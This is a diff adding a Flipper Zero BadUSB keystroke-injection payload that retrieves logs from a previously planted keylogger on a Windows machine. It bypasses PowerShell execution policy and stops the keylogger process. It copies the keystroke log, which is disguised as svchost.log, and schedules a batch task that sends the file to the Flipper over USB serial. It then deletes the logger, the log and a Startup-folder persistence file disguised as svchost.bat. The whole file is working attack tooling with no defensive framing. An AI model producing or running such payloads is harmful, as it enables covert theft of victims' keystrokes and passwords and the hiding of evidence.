@@ -1,0 +1,176 @@
+REM Retrieve Keylog - Fixed v2
+REM Stops keylogger, copies log, schedules transfer to Flipper after USB mode switch
+
+GUI r
+DELAY 1000
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 2000
+
+STRING Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+ENTER
+DELAY 500
+
+REM Stop keylogger FIRST to avoid capturing the rest of this payload
+STRING Get-CimInstance Win32_Process -Filter "CommandLine like '%logger.ps1%'" -EA SilentlyContinue | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }
+ENTER
+STRING Start-Sleep 2
+ENTER
+DELAY 500
+
+REM Check for keylog file
+STRING $l = "$env:TEMP\svchost.log"
+ENTER
+STRING if(-not(Test-Path $l)){Write-Host "No keylog found"; exit}
+ENTER
+DELAY 500
+
+REM Prepare timestamped copy
+STRING $ts = Get-Date -Format "yyyyMMdd_HHmmss"
+ENTER
+STRING $fn = "keylog_$ts.log"
+ENTER
+STRING $tmp = "$env:TEMP\$fn"
+ENTER
+STRING Copy-Item $l $tmp
+ENTER
+DELAY 500
+
+REM Create transfer batch file (runs after Flipper switches from HID to serial mode)
+STRING $tgt = "/ext/apps_data/keylogger/keylogs/$fn"
+ENTER
+STRING $bat = @"
+ENTER
+STRING @echo off
+ENTER
+STRING setlocal enabledelayedexpansion
+ENTER
+STRING echo [TRANSFER] Waiting 45 seconds for USB mode switch...
+ENTER
+STRING timeout 45 >nul
+ENTER
+STRING set KEYLOG=$tmp
+ENTER
+STRING set TARGET=$tgt
+ENTER
+STRING set UFBT=%USERPROFILE%\.ufbt\current\scripts\storage.py
+ENTER
+STRING if not exist "!UFBT!" set UFBT=%USERPROFILE%\.ufbt\toolchain\storage.py
+ENTER
+STRING if not exist "!UFBT!" (
+ENTER
+STRING   echo [TRANSFER] UFBT not found
+ENTER
+STRING   echo [TRANSFER] Install with: pip install ufbt
+ENTER
+STRING   echo [TRANSFER] File saved at: !KEYLOG!
+ENTER
+STRING   pause
+ENTER
+STRING   goto end
+ENTER
+STRING )
+ENTER
+STRING echo [TRANSFER] Trying auto-detection...
+ENTER
+STRING python "!UFBT!" send "!KEYLOG!" "!TARGET!" >nul 2>&1
+ENTER
+STRING if !errorlevel! equ 0 (
+ENTER
+STRING   echo [TRANSFER] SUCCESS
+ENTER
+STRING   del "!KEYLOG!" 2>nul
+ENTER
+STRING   goto end
+ENTER
+STRING )
+ENTER
+STRING py "!UFBT!" send "!KEYLOG!" "!TARGET!" >nul 2>&1
+ENTER
+STRING if !errorlevel! equ 0 (
+ENTER
+STRING   echo [TRANSFER] SUCCESS
+ENTER
+STRING   del "!KEYLOG!" 2>nul
+ENTER
+STRING   goto end
+ENTER
+STRING )
+ENTER
+STRING echo [TRANSFER] Auto-detect failed, scanning COM ports...
+ENTER
+STRING for /f "tokens=3" %%p in (
+ENTER
+STRING   'reg query "HKLM\HARDWARE\DEVICEMAP\SERIALCOMM" 2^>nul'
+ENTER
+STRING ) do (
+ENTER
+STRING   echo [TRANSFER] Trying %%p...
+ENTER
+STRING   python "!UFBT!" -p %%p send "!KEYLOG!" "!TARGET!" >nul 2>&1
+ENTER
+STRING   if !errorlevel! equ 0 (
+ENTER
+STRING     echo [TRANSFER] SUCCESS via %%p
+ENTER
+STRING     del "!KEYLOG!" 2>nul
+ENTER
+STRING     goto end
+ENTER
+STRING   )
+ENTER
+STRING   py "!UFBT!" -p %%p send "!KEYLOG!" "!TARGET!" >nul 2>&1
+ENTER
+STRING   if !errorlevel! equ 0 (
+ENTER
+STRING     echo [TRANSFER] SUCCESS via %%p
+ENTER
+STRING     del "!KEYLOG!" 2>nul
+ENTER
+STRING     goto end
+ENTER
+STRING   )
+ENTER
+STRING )
+ENTER
+STRING echo [TRANSFER] All methods failed
+ENTER
+STRING echo [TRANSFER] File saved at: !KEYLOG!
+ENTER
+STRING pause
+ENTER
+STRING :end
+ENTER
+STRING del "%TEMP%\flip_tmp*.txt" 2>nul
+ENTER
+STRING del "%~f0" 2>nul
+ENTER
+STRING "@
+ENTER
+DELAY 500
+
+REM Save transfer batch and schedule it
+STRING $bat | Out-File "$env:TEMP\transfer.bat" -Encoding ASCII
+ENTER
+STRING $t = (Get-Date).AddMinutes(2).ToString("HH:mm")
+ENTER
+STRING $d = (Get-Date).ToString("MM/dd/yyyy")
+ENTER
+STRING schtasks /create /tn FlipperTX /tr "$env:TEMP\transfer.bat" /sc once /st $t /sd $d /f
+ENTER
+DELAY 500
+
+REM Clean up deployment artifacts
+STRING Remove-Item "$env:TEMP\svchost.log" -Force -EA SilentlyContinue
+ENTER
+STRING Remove-Item "$env:TEMP\logger.ps1" -Force -EA SilentlyContinue
+ENTER
+STRING Remove-Item "$env:TEMP\badusb_status.txt" -Force -EA SilentlyContinue
+ENTER
+STRING $sp = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat"
+ENTER
+STRING Remove-Item $sp -Force -EA SilentlyContinue
+ENTER
+DELAY 500
+STRING exit
+ENTER
